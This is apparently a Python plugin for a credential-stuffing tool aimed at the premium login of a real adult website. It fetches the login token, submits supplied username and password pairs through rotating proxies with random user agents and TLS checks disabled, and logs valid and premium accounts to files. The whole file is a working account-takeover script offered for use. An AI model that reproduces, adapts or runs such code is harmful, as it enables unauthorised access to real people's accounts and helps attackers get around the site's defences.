import requests
from utils.utils import Help
import os,sys
from bs4 import BeautifulSoup as soup

# Turning off warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Brute(object):
    def __init__(self):
        # ========================================
        # Project information
        self.projectName = "Porn"
        self.projectFullName = "PornHub"
        self.description = "Author : Pirate2110"
    def check(self, login, password, proxytype, proxy, timeout):
        try:
            # if proxy == null pass
            if proxy == "err":
                print("proxerr")
                pass
            else:
                with requests.session() as s:
                    # All what u need for project start - here
                    # ========================================
                    # Proxy
                    if proxytype == "no":
                        proxies = None
                    elif proxytype == "burp":
                        proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
                    elif proxytype == "https":
                        proxies = {'https': "http://" + proxy}
                    elif proxytype == "socks4":
                        proxies = {'https': "socks4://" + proxy}
                    elif proxytype == "socks5":
                        proxies = {'https': "socks5://" + proxy}

                    # ========================================
                    # Headers
                    headers = {'User-Agent' : Help.getRandomUa()}
                    # Token
                    r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=timeout, headers=headers)
                    site = soup(r.text, "html.parser")
                    token = site.find("input", id="token")
                    body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
                    # Auth request
                    r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=timeout, headers=headers)
                    # ========================================
                    # good or bad if statement
                    if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
                        return "bad"

                    elif r.json()['success'] == "1":
                        if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
                            Help.writelog("good.txt", login + ":" + password + "|" + str(r.text))
                        else:
                            Help.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
                        return "good"
                        #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
                    else:
                        return "projerrror"
                    # ========================================
        except Exception as e:
            #  ========================================
            #  some info about error
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(e, exc_type, fname, exc_tb.tb_lineno)
            return "error"






